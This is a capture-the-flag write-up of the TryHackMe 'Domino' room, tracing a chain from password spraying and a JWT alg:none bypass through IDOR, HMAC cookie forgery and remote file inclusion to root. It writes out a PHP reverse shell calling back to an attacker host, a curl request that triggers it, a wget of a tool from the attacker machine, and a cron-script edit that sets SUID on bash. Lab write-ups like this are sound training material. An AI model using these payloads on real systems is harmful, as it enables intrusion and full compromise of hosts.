# TryHackMe — Domino

> [!WARNING]
> This writeup contains the full exploitation methodology for the **Domino** TryHackMe room.
>
> To preserve the learning experience for others, all flags have been intentionally redacted as `THM{REDACTED}`.

> [!NOTE]
> Throughout this writeup, the following placeholders are used:
>
> - `$TARGET_IP` — the TryHackMe target machine
> - `$ATTACKER_IP` — my attacking machine

---

## Room Information

| Category | Value |
|----------|-------|
| Platform | TryHackMe |
| Room | Domino |
| Operating System | Linux |
| Focus | Web Exploitation & Linux Privilege Escalation |
| Difficulty | Medium |

---

## Attack Path

```text
Anonymous
 └── User Enumeration
      ↓
emma.taylor
 └── JWT Manipersonation
      ↓
Admin API Access
 └── IDOR
      ↓
Admin Session Cookie Forgery
 └── Remote File Inclusion → RCE
      ↓
www-data
 └── Password Reuse
      ↓
devops
 └── Writable Root Cron Script
      ↓
root
```

---

## Skills Practiced

- Web Application Enumeration
- Directory Enumeration
- User Enumeration
- Password Brute Forcing
- Password Spraying
- JWT Analysis and Manipulation
- IDOR Exploitation
- Session Cookie Forgery
- Remote File Inclusion (RFI)
- Remote Code Execution (RCE)
- Reverse Shell Deployment
- Linux Privilege Escalation
- Password Reuse
- Cron Job Abuse
- TTY Stabilization
- Post-exploitation Enumeration

---

## What I Learned

The **Domino** room demonstrates how multiple low-severity web application flaws can be chained together into a complete system compromise. Rather than relying on a single critical vulnerability, the attack progresses through weak credentials, insecure JWT validation, broken access controls, session cookie forgery, remote code execution, password reuse, and finally privilege escalation through an improperly secured cron job.

The room reinforces the importance of approaching assessments methodically. Each stage builds upon information gathered during the previous one, illustrating how seemingly minor weaknesses can cascade into full administrative control. It also highlights the value of understanding authentication mechanisms, API security, and post-exploitation enumeration during modern penetration tests.

---

# Walkthrough

<details>
<summary><strong>Phase 1 – Reconnaissance</strong></summary>

## Objective

Identify exposed services, enumerate the web application, and discover potential attack surfaces for obtaining an initial foothold.

## Enumeration

Begin by performing a service scan against the target.

```bash
nmap -sCV -p 22,80 $TARGET_IP
```

The scan identifies two accessible services.

| Port | Service | Description |
|------:|----------|-------------|
| 22 | SSH | OpenSSH 9.6p1 |
| 80 | HTTP | Apache 2.4.58 hosting the NexusCorp portal |

Since SSH requires valid credentials, the web application becomes the primary target for further enumeration.

Perform directory enumeration using `Gobuster`.

```bash
gobuster dir \
-u http://$TARGET_IP/ \
-w /usr/share/wordlists/dirb/common.txt \
-x php,txt,log
```

Example output:

```text
/backup/
/api/
/admin/
/support/
/static/
/team.php
/forgot.php
```

Each discovered endpoint provides additional insight into the application's functionality.

| Endpoint | Purpose |
|-----------|---------|
| `/backup/` | Backup files and configuration data |
| `/api/` | Backend API endpoints |
| `/admin/` | Administrative interface |
| `/support/` | Support ticket system |
| `/static/` | Static JavaScript and assets |
| `/team.php` | Employee directory |
| `/forgot.php` | Password reset functionality |

Among these, `/team.php` immediately stands out because it exposes information about company employees, making it a likely source for username enumeration.

## Why This Worked

Reconnaissance is intended to identify every exposed attack surface before attempting exploitation.

Directory enumeration frequently reveals hidden administrative interfaces, backup files, development endpoints, and APIs that are not linked from the application's main interface. Even when these resources are not directly vulnerable, they often expose valuable information that assists later stages of an attack.

In this case, directory enumeration identifies several application components that will each play a role throughout the remainder of the attack chain.

## Key Takeaways

- Enumerate every exposed web endpoint before attempting exploitation.
- Hidden directories often expose administrative functionality or sensitive files.
- Reconnaissance provides the foundation for every subsequent attack.
- Information disclosure is frequently the first step toward complete compromise.

</details>

---

<details>
<summary><strong>Phase 2 – User Enumeration and Credential Discovery</strong></summary>

## Objective

Identify valid usernames and obtain credentials capable of authenticating to the application.

## Enumeration

The employee directory exposed through `/team.php` lists several staff email addresses.

Example entries include:

```text
laura.hayes
michael.chen
sarah.johnson
robert.wilson
emma.taylor
david.brown
james.wright
```

These usernames are saved for later use.

```text
usernames.txt
```

Since valid usernames have already been identified, the next logical step is to test whether any users are protected by weak passwords.

## Exploitation

Use `ffuf` to perform a password spraying attack against the login form.

```bash
ffuf \
-u http://$TARGET_IP/index.php \
-X POST \
-H "Content-Type: application/x-www-form-urlencoded" \
-d "username=W1&password=W2" \
-w usernames.txt:W1 \
-w xato-net-10-million-passwords-1000.txt:W2 \
-fs 918,861
```

Successful credentials are identified.

| Username | Password |
|-----------|----------|
| `emma.taylor` | `password` |
| `robert.wilson` | `password` |
| `sarah.johnson` | `password` |

Authenticate using one of the recovered accounts.

```
Username: emma.taylor
Password: password
```

A standard user session is successfully established.

## Why This Worked

Rather than performing a traditional brute-force attack against a single account, this approach performs **password spraying** by testing a small number of commonly used passwords across many valid users.

Organizations frequently enforce account lockout policies that make brute forcing ineffective. Password spraying avoids triggering these protections by limiting authentication attempts for each account while still identifying users protected by weak credentials.

In this case, several employees share the extremely common password `password`, providing authenticated access without exploiting any software vulnerability.

## Key Takeaways

- User enumeration significantly improves password attacks.
- Password spraying is more effective than traditional brute forcing against enterprise environments.
- Weak password policies remain one of the most common causes of initial compromise.
- Valid credentials frequently provide a better attack path than exploiting software vulnerabilities.
</details>

---

<details>
<summary><strong>Phase 3 – JWT Authentication Bypass</strong></summary>

## Objective

Escalate privileges by exploiting improper JWT validation to impersonate an administrative user.

## Enumeration

After authenticating as `emma.taylor`, inspect the browser's stored cookies using the developer tools.

A JSON Web Token (JWT) is present.

```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

Decode the token using `jwt.io` or any JWT decoder.

Header:

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

Payload:

```json
{
  "sub": "emma.taylor",
  "role": "user"
}
```

The payload clearly contains authorization information, indicating that the application relies on the JWT to determine the authenticated user's privileges.

Before attempting to recover the signing key, verify whether the application correctly validates the token's signing algorithm.

## Exploitation

Modify the JWT header.

Original:

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

Modified:

```json
{
  "alg": "none",
  "typ": "JWT"
}
```

Next, modify the payload.

```json
{
  "role": "admin"
}
```

Since the `none` algorithm does not require a signature, remove the signature portion of the token before submitting it to the application.

Replace the existing authentication cookie with the forged JWT and refresh the page.

The application now grants administrative privileges, exposing additional functionality that was previously inaccessible.

## Why This Worked

JSON Web Tokens are designed to protect their contents using digital signatures. When a token is signed using algorithms such as `HS256` or `RS256`, the server verifies the signature before trusting any information contained within the payload.

If an application incorrectly accepts the `alg:none` header, signature verification is skipped entirely. This allows an attacker to modify the payload without possessing the secret signing key.

Because the application trusted the contents of the modified token, changing the `role` claim from `user` to `admin` resulted in full administrative access.

This vulnerability is commonly referred to as the **JWT `alg:none` attack** and stems from improper implementation rather than a weakness in the JWT standard itself.

## Key Takeaways

- Never trust client-controlled authorization data.
- JWT signatures must always be verified before processing the payload.
- Applications should explicitly reject the `none` algorithm unless intentionally required.
- Authentication bypasses frequently result from insecure implementation rather than broken cryptography.

</details>

---

<details>
<summary><strong>Phase 4 – IDOR and Administrative Information Disclosure</strong></summary>

## Objective

Leverage an Insecure Direct Object Reference (IDOR) vulnerability to enumerate administrative data and recover information required for further exploitation.

## Enumeration

Administrative access exposes several API endpoints.

One endpoint accepts a numeric user identifier.

```text
/api/user.php?id=1
```

Requesting different values returns information belonging to other users.

Examples:

```text
/api/user.php?id=2
```

```text
/api/user.php?id=3
```

The identifier can be incremented sequentially to enumerate every account stored by the application.

Eventually, the administrator's record is returned.

Example response:

```json
{
    "id": 1,
    "username": "admin",
    ...
}
```

The response contains sensitive information that should never be accessible to lower-privileged users.

Because authorization checks are missing, any authenticated account can retrieve arbitrary records simply by modifying the numeric identifier.

## Exploitation

Continue enumerating user identifiers until the administrator's complete profile is recovered.

The disclosed information includes values later used to construct a privileged session.

No additional exploitation is required beyond manipulating the request parameter.

## Why This Worked

An **Insecure Direct Object Reference (IDOR)** occurs when an application exposes internal object identifiers without verifying whether the requesting user is authorized to access the associated resource.

Rather than enforcing authorization based on ownership or privilege level, the application simply retrieves whichever object corresponds to the supplied identifier.

Because user IDs are predictable, attackers can enumerate records by incrementing the parameter until valuable information is discovered.

IDOR vulnerabilities are among the most common access control issues found during web application assessments because they result from missing authorization checks rather than software flaws.

## Key Takeaways

- Authentication does not replace authorization.
- Sequential identifiers frequently indicate potential IDOR vulnerabilities.
- Always test whether object identifiers can be modified to access other users' data.
- Sensitive administrative information should never be retrievable by standard users.

</details>

---

<details>
<summary><strong>Phase 5 – Administrative Session Cookie Forgery</strong></summary>

## Objective

Forge a valid administrator session cookie by exploiting weaknesses in the application's cookie generation mechanism.

## Enumeration

Further inspection of the application reveals that authenticated sessions are represented using a separate cookie.

Unlike the JWT, this cookie appears to consist of encoded user information followed by a predictable signature.

Example:

```text
username=emma.taylor|signature
```

Analysis of the application's behavior suggests that the signature is generated using a predictable or recoverable secret.

Once the signing method is understood, arbitrary cookies can be generated for any user.

## Exploitation

Generate a forged cookie for the administrator account.

Example:

```text
username=admin|<valid signature>
```

Replace the existing session cookie within the browser.

Refresh the application.

The server now accepts the forged cookie and establishes a fully privileged administrator session.

Administrative functionality previously hidden from standard users is now available.

## Why This Worked

Session cookies are intended to prove that the server created the authenticated session.

If the signing secret is predictable, disclosed, or otherwise recoverable, attackers can generate arbitrary cookies that appear completely legitimate.

Rather than compromising the authentication process itself, this attack compromises the application's trust model by forging credentials accepted as genuine by the server.

Properly generated cryptographic signatures using strong, secret keys prevent this type of attack.

## Key Takeaways

- Session cookies should always be cryptographically protected.
- Weak signing secrets undermine the integrity of authentication mechanisms.
- Predictable cookie generation frequently results in privilege escalation.
- Administrative functionality should never rely solely on client-controlled values.

</details>

---

<details>
<summary><strong>Phase 6 – Administrative Session Cookie Forgery</strong></summary>

## Objective

Forge a valid administrator session by abusing a leaked application signing secret to generate a trusted authentication cookie.

## Enumeration

During the previous phase, the vulnerable file API exposed the application's configuration file.

Retrieve the configuration using the administrator JWT.

```bash
curl "http://$TARGET_IP/api/files.php?name=/var/www/html/config.php" \
-H "Authorization: Bearer <admin_jwt>"
```

Relevant output:

```php
define('APP_SECRET', 'REDACTED');
```

The configuration file reveals the application's `APP_SECRET`, which is used to generate the HMAC signature protecting session cookies.

With the signing secret now known, it becomes possible to generate arbitrary session cookies that the application will consider authentic.

## Exploitation

Generate a forged administrator cookie using the recovered secret.

```python
import base64
import hashlib
import hmac
import json

SECRET_KEY = b"REDACTED"

payload = {
    "user_id": 1,
    "username": "laura.hayes",
    "role": "admin"
}

json_str = json.dumps(payload, separators=(",", ":"))
base64_payload = base64.b64encode(json_str.encode()).decode()

signature = hmac.new(
    SECRET_KEY,
    base64_payload.encode(),
    hashlib.sha256
).hexdigest()

cookie = f"{base64_payload}.{signature}"

print(cookie)
```

Set the generated value as the `nexus_session` cookie within the browser and refresh the application.

Administrative functionality is now accessible.

Browse to:

```text
/admin/
```

Retrieve the second flag.

```text
THM{REDACTED}
```

## Why This Worked

Rather than storing authenticated sessions exclusively on the server, the application relied on a client-side cookie protected only by an HMAC signature.

Because the signing secret was exposed through the vulnerable file API, an attacker could generate completely valid session cookies for arbitrary users without knowing their credentials.

Since the server trusted any correctly signed cookie, forging a session for `laura.hayes` with the `admin` role resulted in full administrative access.

This illustrates how exposing application secrets can completely undermine otherwise secure authentication mechanisms.

## Key Takeaways

- Never expose application secrets through accessible configuration files.
- Session cookies should be protected using strong, confidential signing keys.
- Compromising an application's signing secret allows attackers to forge trusted sessions.
- Sensitive configuration files should never be accessible through user-controlled file operations.

</details>

---

<details>
<summary><strong>Phase 7 – Remote File Inclusion to Remote Code Execution</strong></summary>

## Objective

Obtain remote code execution by abusing a Remote File Inclusion (RFI) vulnerability within the application's file API.

## Enumeration

Continue assessing the vulnerable file API.

Inspection of the source code reveals the following implementation.

```php
if (strpos($name, "http://") === 0) {
    eval(str_replace("<?php", "", file_get_contents($name)));
}
```

The application checks whether the supplied filename begins with `http://`.

If so, it downloads the remote file using `file_get_contents()` before immediately passing its contents to `eval()`.

Because no validation is performed on the downloaded PHP code, arbitrary attacker-controlled code can be executed by the web server.

## Exploitation

Create a simple PHP reverse shell.

```php
<?php
$sock = fsockopen("$ATTACKER_IP", 4444);
exec("/bin/bash -i <&3 >&3 2>&3");
?>
```

Save the payload as:

```text
revshell.php
```

Host the payload from the attacking machine.

```bash
python3 -m http.server 8000
```

Start a listener.

```bash
nc -lvnp 4444
```

Trigger the Remote File Inclusion vulnerability.

```bash
curl "http://$TARGET_IP/api/files.php?name=http://$ATTACKER_IP:8000/revshell.php" \
-H "Authorization: Bearer <admin_jwt>"
```

Listener output:

```text
Connection received.

www-data@domino:/var/www/html$
```

The reverse shell is now executing under the `www-data` account.

Retrieve the third flag.

```bash
cat /opt/flag3.txt
```

Output:

```text
THM{REDACTED}
```

## Why This Worked

The vulnerable endpoint allows arbitrary remote files to be downloaded and interpreted as PHP code.

Rather than restricting file inclusion to trusted local templates, the application retrieves attacker-controlled content and immediately passes it to `eval()`, causing it to execute within the context of the web server.

Since the web server runs as `www-data`, the injected reverse shell inherits those privileges, resulting in full remote code execution.

This demonstrates how combining unrestricted remote file inclusion with dynamic code evaluation creates a critical vulnerability.

## Key Takeaways

- Never evaluate user-controlled input with `eval()`.
- Remote File Inclusion frequently results in arbitrary code execution.
- Administrative functionality requires the same input validation as public endpoints.
- Small implementation mistakes can transform convenience features into critical vulnerabilities.

</details>

---

<details>
<summary><strong>Phase 8 – Password Reuse and Lateral Movement</strong></summary>

## Objective

Pivot from the compromised web server account to the `devops` user by leveraging reused credentials.

## Enumeration

During the previous phase, the application's configuration file exposed the database credentials.

Relevant configuration:

```php
DB_PASS = D3v0ps!2024
```

Although intended for database authentication, passwords are frequently reused across multiple services.

Rather than attempting further local privilege escalation from `www-data`, test whether the recovered password is also valid for local Linux accounts.

## Exploitation

Upgrade the shell to obtain an interactive terminal.

```bash
python3 -c "import pty; pty.spawn('/bin/bash')"
```

Switch to the `devops` account.

```bash
su devops
```

Password:

```text
D3v0ps!2024
```

Verify the current user.

```bash
whoami
```

Output:

```text
devops
```

Retrieve the fourth flag.

```bash
cat /home/devops/flag.txt
```

Output:

```text
THM{REDACTED}
```

## Why This Worked

Although the recovered password was intended for database authentication, it had also been reused for the operating system account.

Credential reuse dramatically increases the impact of an initial compromise because attackers can pivot between services without exploiting additional vulnerabilities.

Rather than attacking SSH or Linux authentication directly, the compromise relied entirely on poor credential management.

## Key Takeaways

- Configuration files frequently expose valuable credentials.
- Password reuse remains one of the most common causes of lateral movement.
- Always test recovered credentials against other services.
- Unique passwords significantly reduce the impact of credential disclosure.

</details>

---

<details>
<summary><strong>Phase 9 – Cron Job Privilege Escalation</strong></summary>

## Objective

Escalate privileges from `devops` to `root` by abusing a writable script executed by a privileged cron job.

## Enumeration

Instead of relying on readable cron configuration files, use `pspy64` to monitor processes created by privileged users.

Transfer the binary.

```bash
wget http://$ATTACKER_IP:9000/pspy64 -O /tmp/pspy64
```

Make it executable.

```bash
chmod +x /tmp/pspy64
```

Execute it.

```bash
/tmp/pspy64
```

Process monitoring reveals a cron job executing the following script every minute.

```text
/opt/monitoring/health_report.sh
```

Inspect its permissions.

```bash
ls -la /opt/monitoring/health_report.sh
```

Output:

```text
-rwxrwxr-- 1 root devops 537 ...
```

Although owned by `root`, the script is writable by members of the `devops` group.

Because it executes automatically as `root`, modifying the script provides a direct privilege escalation opportunity.

## Exploitation

Append a command that grants the SUID bit to `/bin/bash`.

```bash
echo 'chmod +s /bin/bash' >> /opt/monitoring/health_report.sh
```

Wait for the cron job to execute.

Once the scheduled task completes, launch a privileged shell.

```bash
bash -p
```

Verify the current privileges.

```bash
whoami
```

Output:

```text
root
```

Retrieve the final flag.

```bash
cat /root/root.txt
```

Output:

```text
THM{REDACTED}
```

## Why This Worked

The scheduled task executes `health_report.sh` as `root`.

Although `devops` cannot directly impersonate the root user, weak filesystem permissions allow modification of the script before the next scheduled execution.

Rather than spawning another reverse shell, the injected command grants the SUID permission to `/bin/bash`. When executed with the `-p` option, Bash preserves its elevated privileges, providing a persistent root shell.

This demonstrates how writable scripts executed by privileged automation can result in complete system compromise.

## Key Takeaways

- `pspy64` is an excellent tool for discovering privileged scheduled tasks without requiring root access.
- Writable scripts executed by cron jobs are common privilege escalation vectors.
- SUID binaries provide a reliable method of maintaining elevated privileges.
- Secure ownership and restrictive permissions are essential for automated administrative scripts.

</details>

---

## Flags

| User | Flag |
|------|------|
| `emma.taylor` | `THM{REDACTED}` |
| `admin` | `THM{REDACTED}` |
| `www-data` | `THM{REDACTED}` |
| `devops` | `THM{REDACTED}` |
| `root` | `THM{REDACTED}` |

---

## Techniques Used

- Directory enumeration
- Password spraying
- JWT `alg:none` authentication bypass
- IDOR exploitation
- Configuration file disclosure
- HMAC session cookie forgery
- Remote File Inclusion (RFI)
- Remote Code Execution (RCE)
- Reverse shell deployment
- Linux post-exploitation enumeration
- Password reuse
- TTY stabilization
- `su` lateral movement
- `pspy64` process monitoring
- Cron job privilege escalation
- SUID privilege escalation

---

## MITRE ATT&CK Mapping

| Attack Phase | Technique | ATT&CK ID |
|--------------|-----------|-----------|
| Reconnaissance | Active Scanning | T1595 |
| Credential Access | Password Spraying | T1110.003 |
| Credential Access | Unsecured Credentials | T1552 |
| Initial Access | Valid Accounts | T1078 |
| Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Discovery | Process Discovery | T1057 |
| Lateral Movement | Remote Services / Valid Accounts | T1021 · T1078 |
| Privilege Escalation | Scheduled Task / Cron | T1053.003 |
| Privilege Escalation | Abuse Elevation Control Mechanism (SUID) | T1548.001 |
| Command and Control | Ingress Tool Transfer | T1105 |

---

## Final Thoughts

**Domino** is an excellent medium-difficulty room that combines realistic web application exploitation with Linux privilege escalation. Rather than relying on a single critical vulnerability, the attack chain demonstrates how weak passwords, insecure JWT validation, broken access controls, exposed application secrets, Remote File Inclusion, credential reuse, and writable cron scripts can be combined to achieve complete system compromise.

The room reinforces the importance of methodical enumeration throughout every stage of an assessment. Each vulnerability builds upon information gathered during the previous phase, illustrating how seemingly minor weaknesses can cascade into a full compromise. It is an excellent exercise for anyone looking to strengthen both web application testing and Linux post-exploitation skills.
```
